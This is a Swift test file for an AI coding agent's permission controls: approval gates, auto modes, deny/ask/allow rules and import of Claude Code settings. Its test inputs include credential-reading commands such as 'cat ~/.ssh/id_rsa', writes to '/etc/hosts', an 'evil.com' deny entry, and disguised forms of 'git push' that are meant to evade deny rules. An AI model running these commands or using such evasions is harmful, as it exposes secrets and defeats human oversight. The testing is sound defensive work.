        let gate = ApprovalGate(policy: .autoApprove, delegate: PersistingDelegate(recorder: recorder, persist: true))
        let executor = ComposerPolicyEnforcedToolExecutor(
            base: Probe(), controller: controller(rules: makeStore(file), roots: roots),
            approvalGate: gate, onApprovalReceipt: { recorder.record($0) })
        _ = try await executor.execute(callID: "call-1", name: "shell_execute", input: shell("swift test"))
        _ = try await executor.execute(callID: "call-2", name: "shell_execute", input: shell("swift test"))

        let prompted = try #require(recorder.seenReceipts.first)
        let hit = try #require(recorder.seenReceipts.last)
        #expect(hit.persistentRuleID != nil && prompted.persistentRuleID == nil)
        let expected = ApprovalRiskLevel.max(
            gate.riskLevel(for: "shell_execute"),
            ApprovalGate.inputRiskLevel(tool: "shell_execute", input: ["command": "swift test"]))
        #expect(prompted.riskLevel == expected)
        #expect(hit.riskLevel == expected)
        #expect(hit.riskLevel == .high)
    }

    // MARK: 2026-11-17 第二轮修复（PM-01/02/05/06/18、web_search 规则）

    @Test("auto mode skips the prompt for mkdir/touch/mv/cp only when every path operand passes the guard, by name")
    func autoModeFileOperationsAreGuardedByPathName() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let c = controller(rules: store, roots: [root.path], mode: .auto)
        for command in ["mkdir -p build/out", "touch notes.txt", "mv a.txt b.txt", "cp -r src dst"] {
            #expect(await c.shellMayRunWithoutPrompt(input: try shell(command)), "\(command)")
        }
        // 构建配置按路径名判定：Makefile 还不存在时也要弹卡。
        for command in ["touch Makefile", "cp a Package.swift", "mv a .mcp.json", "touch .claude/x",
                        "cp a ~/.zshenv", "cp a /etc/hosts", "cp -L link out"] {
            #expect(!(await c.shellMayRunWithoutPrompt(input: try shell(command))), "\(command)")
        }
    }

    @Test("fixed redirections, whitelisted env prefixes, wrappers and a leading cd are stripped but the rest is still checked")
    func strippedCommandFormsStillPassTheGuard() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        try FileManager.default.createDirectory(
            at: root.appendingPathComponent("sub", isDirectory: true), withIntermediateDirectories: true)
        let c = controller(rules: store, roots: [root.path], mode: .auto)
        for command in ["ls 2>&1", "ls >/dev/null 2>&1", "CI=1 swift test", "time swift test",
                        "timeout 60 swift build", "cd sub && ls"] {
            #expect(await c.shellMayRunWithoutPrompt(input: try shell(command)), "\(command)")
        }
        for command in ["ls > out.txt", "PATH=/tmp ls", "ls $(pwd)", "cd sub; ls", "cd /etc && ls",
                        "cd sub && cat ~/.ssh/id_rsa", "nohup ls"] {
            #expect(!(await c.shellMayRunWithoutPrompt(input: try shell(command))), "\(command)")
        }
    }

    @Test("manual and auto-edit modes skip the prompt for read-only commands only")
    func manualModeReadOnlyShellIsFree() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        for mode in [ComposerTaskMode.manual, .autoEdit] {
            let c = controller(rules: store, roots: [root.path], mode: mode)
            #expect(try await c.authorize(capability: "shell_execute", input: shell("git status")) == .execute)
            #expect(try await c.authorize(capability: "shell_execute", input: shell("ls -la")) == .execute)
            #expect(try await c.authorize(capability: "shell_execute", input: shell("swift build")) == ask)
            #expect(try await c.authorize(capability: "shell_execute", input: shell("cat ~/.ssh/id_rsa")) == ask)
        }
    }

    @Test("a cwd other than the session default is accepted for rules when it is inside the roots and not an excluded place")
    func ruleCwdMayDifferFromTheDefault() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let sub = root.appendingPathComponent("sub", isDirectory: true)
        try FileManager.default.createDirectory(at: sub, withIntermediateDirectories: true)
        let c = controller(rules: store, roots: [root.path])
        #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell("swift test")) != nil)
        let inSub = try ComposerToolInput(["command": "swift test", "cwd": sub.path])
        #expect(try await c.authorize(capability: "shell_execute", input: inSub) == .execute)
        let outside = try ComposerToolInput(["command": "swift test", "cwd": dir.path])
        #expect(try await c.authorize(capability: "shell_execute", input: outside) == ask)
    }

    @Test("web_search can be allowed from now on and a write rule also covers edits")
    func webSearchRuleAndWriteCoversEdit() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let c = controller(rules: store, roots: [root.path])
        let search = try ComposerToolInput(["query": "site:swift.org concurrency"])
        #expect(try await c.authorize(capability: "web_search", input: search) == ask)
        #expect(await c.persistAllowRule(capability: "web_search", input: search) != nil)
        #expect(try await c.authorize(capability: "web_search", input: search) == .execute)
        let write = try filePath(root.appendingPathComponent("a.swift").path)
        #expect(await c.persistAllowRule(capability: "file_write", input: write) != nil)
        let edit = try ComposerToolInput(["path": root.appendingPathComponent("b.swift").path])
        #expect(try await c.authorize(capability: "file_edit", input: edit) == .execute)
    }

    // MARK: 规则管理面板：拒绝、每次询问、导入、旧文件兼容

    private func ruleContext(_ root: URL) -> PermissionRuleContext {
        PermissionRuleContext(
            trustedProjectRoot: nil, allowedRoots: [root.path],
            home: "/nonexistent-home-for-persistent-rule-tests")
    }

    @Test("a deny rule beats an allow rule and holds in every mode including bypass")
    func denyRuleWinsEverywhere() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let seed = controller(rules: store, roots: [root.path])
        #expect(await seed.persistAllowRule(capability: "shell_execute", input: try shell("swift test")) != nil)
        #expect(try await seed.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)

        let added = store.addManualRule(
            draft: PermissionRuleDraft(behavior: .deny, type: .shellPrefix, pattern: "swift test", scope: .project),
            context: ruleContext(root))
        #expect((try? added.get().behavior) == .deny)

        let plain = try shell("swift test --verbose")
        let compound = try shell("cd sub && swift test")
        let other = try shell("swift build")
        for mode in [ComposerTaskMode.manual, .autoEdit, .bypassPermission] {
            let c = controller(rules: store, roots: [root.path], mode: mode)
            await #expect(throws: ComposerAuthorizationError.self) {
                try await c.authorize(capability: "shell_execute", input: plain)
            }
            await #expect(throws: ComposerAuthorizationError.self) {
                try await c.authorize(capability: "shell_execute", input: compound)
            }
        }
        // 没有被拒绝的命令不受影响（绕过档本来就免问）。
        let bypass = controller(rules: store, roots: [root.path], mode: .bypassPermission)
        #expect(try await bypass.authorize(capability: "shell_execute", input: other) == .execute)
        // 删掉拒绝规则后恢复原来的"已允许"。
        let denyID = try #require(store.allRules().first { $0.behavior == .deny }).id
        #expect(store.allRules().first { $0.id == denyID }?.lastMatchedAt != nil)
        #expect(store.remove(id: denyID))
        #expect(try await seed.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)
    }

    @Test("an ask rule prompts even where no prompt was needed, beats allow rules, and is skipped in bypass")
    func askRulePromptsEvenWhenFree() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let context = ruleContext(root)
        let manual = controller(rules: store, roots: [root.path])
        let autoEdit = controller(rules: store, roots: [root.path], mode: .autoEdit)
        let bypass = controller(rules: store, roots: [root.path], mode: .bypassPermission)
        let target = root.appendingPathComponent("a.swift").path
        let write = try filePath(target)
        // 基线：只读命令（手动档）和授权根内写文件（自动编辑档）本来都免问。
        #expect(try await manual.authorize(capability: "shell_execute", input: shell("git status")) == .execute)
        #expect(try await autoEdit.authorize(capability: "file_write", input: write) == .execute)
        #expect(await manual.persistAllowRule(capability: "shell_execute", input: try shell("swift test")) != nil)
        #expect(try await manual.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)

        for draft in [
            PermissionRuleDraft(behavior: .ask, type: .shellPrefix, pattern: "git status", scope: .project),
            PermissionRuleDraft(behavior: .ask, type: .shellPrefix, pattern: "swift test", scope: .project),
            PermissionRuleDraft(behavior: .ask, type: .writePath, pattern: target, scope: .global),
        ] {
            #expect((try? store.addManualRule(draft: draft, context: context).get()) != nil)
        }
        #expect(try await manual.authorize(capability: "shell_execute", input: shell("git status")) == ask)
        #expect(try await manual.authorize(capability: "shell_execute", input: shell("swift test")) == ask)
        #expect(try await autoEdit.authorize(capability: "file_write", input: write) == ask)
        // 绕过档不受"每次询问"影响。
        #expect(try await bypass.authorize(capability: "shell_execute", input: shell("git status")) == .execute)
        // 同目录下别的文件仍然免问。
        let other = try filePath(root.appendingPathComponent("b.swift").path)
        #expect(try await autoEdit.authorize(capability: "file_write", input: other) == .execute)
    }

    @Test("Claude Code permissions import maps the supported forms, lists the rest, and the saved rules take effect")
    func importMapsClaudeCodeSettings() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let settings = """
        {"permissions":{
          "allow":["Bash(npm test:*)","Read(src/**)","Edit(src/**)","WebFetch(domain:example.com)",
                   "mcp__github__create_issue","Bash(rm:*)","Task(x)"],
          "deny":["Bash(git push:*)","Read(./.env)","WebFetch(domain:evil.com)","mcp__fs__write"],
          "ask":["Bash(npm publish:*)"]}}
        """
        let context = ruleContext(root)
        let preview = ClaudeSettingsPermissionsImporter.parse(
            data: Data(settings.utf8), source: "settings.json", projectRoot: root.path, context: context)
        #expect(preview.candidates.count == 9)
        #expect(Set(preview.skipped.map(\.original)) == ["mcp__github__create_issue", "Bash(rm:*)", "Task(x)"])
        func draft(_ original: String) -> PermissionRuleDraft? {
            preview.candidates.first { $0.original == original }?.draft
        }
        #expect(draft("Bash(npm test:*)") == PermissionRuleDraft(
            behavior: .allow, type: .shellPrefix, pattern: "npm test", scope: .project))
        #expect(draft("Read(./.env)")?.pattern == root.path + "/.env")
        #expect(draft("Read(./.env)")?.behavior == .deny)
        #expect(draft("Read(src/**)")?.pattern == root.path + "/src")
        #expect(draft("Bash(npm publish:*)")?.behavior == .ask)

        let result = store.importRules(preview.candidates, context: context)
        #expect(result.saved.count == 9 && result.failed.isEmpty)
        #expect(result.saved.allSatisfy { $0.origin == .imported })

        let c = controller(rules: store, roots: [root.path])
        #expect(try await c.authorize(capability: "shell_execute", input: shell("npm test")) == .execute)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("npm publish")) == ask)
        let push = try shell("git push origin main")
        await #expect(throws: ComposerAuthorizationError.self) {
            try await c.authorize(capability: "shell_execute", input: push)
        }
        let envRead = try ComposerToolInput(["path": root.appendingPathComponent(".env").path])
        await #expect(throws: ComposerAuthorizationError.self) {
            try await c.authorize(capability: "file_read", input: envRead)
        }
    }

    @Test("a manual allow rule keeps every safety floor and says why it was refused")
    func manualAllowRefusedWithReason() throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let context = ruleContext(root)
        func refusal(_ type: PermissionRuleType, _ pattern: String) -> String? {
            if case .failure(let rejection) = store.addManualRule(
                draft: PermissionRuleDraft(behavior: .allow, type: type, pattern: pattern, scope: .project),
                context: context) { return rejection.reason }
            return nil
        }
        #expect(refusal(.shellPrefix, "rm") != nil)
        #expect(refusal(.shellPrefix, "git") != nil)
        #expect(refusal(.writePath, root.appendingPathComponent("Package.swift").path) != nil)
        #expect(refusal(.writePath, root.appendingPathComponent(".git").path) != nil)
        #expect(refusal(.writePath, dir.path) != nil)
        #expect(refusal(.readDirectory, "/") != nil)
        // 同样的内容设为"拒绝"或"每次询问"不受这些限制。
        #expect((try? store.addManualRule(
            draft: PermissionRuleDraft(behavior: .deny, type: .shellPrefix, pattern: "rm", scope: .global),
            context: context).get()) != nil)
        #expect((try? store.addManualRule(
            draft: PermissionRuleDraft(behavior: .allow, type: .shellPrefix, pattern: "npm test", scope: .project),
            context: context).get()) != nil)
    }

    @Test("an old rule file without behavior fields loads as allow rules, and deny rules are stored beside them")
    func oldRuleFileStaysCompatible() throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let legacy = """
        {"schemaVersion":1,"rules":[{"id":"r1","projectKey":"k","projectRoots":["/x"],"kind":"shell-command-prefix",
        "capability":"shell_execute","pattern":"swift test","createdAt":"2027-01-15T08:00:00Z"}]}
        """
        try Data(legacy.utf8).write(to: file)
        let store = makeStore(file)
        let loaded = try #require(store.allRules().first)
        #expect(store.allRules().count == 1 && loaded.behavior == .allow && loaded.origin == .approvalCard)
        #expect(store.diagnostics().isEmpty)

        let deny = PersistentApprovalRule(
            projectKey: PersistentApprovalRule.globalProjectKey, projectRoots: [], kind: .shellCommandPrefix,
            capability: "shell_execute", pattern: "git push", behavior: .deny, origin: .manual)
        #expect(store.add(deny))
        let json = try JSONSerialization.jsonObject(with: Data(contentsOf: file)) as? [String: Any]
        #expect(json?["schemaVersion"] as? Int == 1)
        #expect((json?["rules"] as? [Any])?.count == 1)
        #expect((json?["restrictions"] as? [Any])?.count == 1)
        let rebuilt = makeStore(file)
        #expect(rebuilt.allRules().map(\.behavior) == [.allow, .deny])
    }
}

@Suite("Deny/ask rule matching hardening")
struct PermissionRuleHardeningTests {
    @Test("shell prefix deny catches env prefixes, quotes, git options, reserved words, case")
    func shellPrefixVariants() {
        let commands = [
            "GIT_SSH_COMMAND=x git push", "FOO=1 BAR=2 git push", "git -C . push", "git -c a=b push origin",
            "git --no-pager --git-dir=.git push", "g''it push", "if true; then git push; fi", "{ git push; }",
            "command git push", "exec git push", "env FOO=1 git push", "nohup git push", "GIT push", "/usr/bin/GIT push",
        ]
        for command in commands {
            #expect(PermissionRuleMatching.shellPrefixMatches(prefix: "git push", command: command), "\(command)")
        }
        #expect(!PermissionRuleMatching.shellPrefixMatches(prefix: "git push", command: "git status"))
        #expect(!PermissionRuleMatching.shellPrefixMatches(prefix: "git push", command: "git -C push status"))
    }

    @Test("path deny rule matches the /System/Volumes/Data view of the same file")
    func pathRuleStripsDataVolume() {
        #expect(PermissionRuleMatching.pathMatches(
            pattern: "/Users/u/proj/.env", candidates: ["/System/Volumes/Data/Users/u/proj/.env"]))
        #expect(PermissionRuleMatching.pathMatches(
            pattern: "/System/Volumes/Data/Users/u/proj/secrets", candidates: ["/Users/u/proj/secrets/a.txt"]))
        #expect(!PermissionRuleMatching.pathMatches(
            pattern: "/Users/u/proj/secrets", candidates: ["/System/Volumes/Data/Users/u/proj/other/a.txt"]))
    }

    @Test("global allow rule cannot cover commands that run project code")
    func globalAllowRejectedForProjectCode() {
        let context = PermissionRuleContext(trustedProjectRoot: "/Users/u/proj", allowedRoots: ["/Users/u/proj"])
        func build(_ pattern: String, _ scope: PersistentApprovalRuleScope) -> Bool {
            let draft = PermissionRuleDraft(behavior: .allow, type: .shellPrefix, pattern: pattern, scope: scope)
            if case .success = PermissionRuleBuilder.build(draft: draft, origin: .manual, context: context) { return true }
            return false
        }
        #expect(!build("npm test", .global))
        #expect(!build("swift build", .global))
        #expect(!build("python3 build.py", .global))
        #expect(build("npm test", .session("s1")))
        #expect(build("git status", .global))
    }
}
